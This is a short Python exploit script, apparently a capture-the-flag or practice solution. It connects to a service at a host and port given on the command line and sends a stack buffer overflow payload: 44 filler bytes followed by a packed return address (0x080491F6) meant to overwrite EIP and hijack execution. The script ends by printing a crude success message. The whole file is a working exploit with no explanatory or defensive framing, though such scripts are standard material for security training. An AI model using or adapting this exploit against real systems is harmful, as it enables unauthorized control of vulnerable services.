#!/usr/bin/env python3

import socket, argparse, struct

parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type=str,
    help="The hostname or IP address",
)
parser.add_argument(
    "port",
    type=int,
    help="The port for the service to connect to",
)
args = parser.parse_args()

offset = 44
new_eip = struct.pack("<I", 0x080491F6)

payload = b"".join([b"A" * 44, new_eip])
payload += b"\n"

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(4096).decode("utf-8"))
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))

print("\nYou got it ya dirty basterd!")
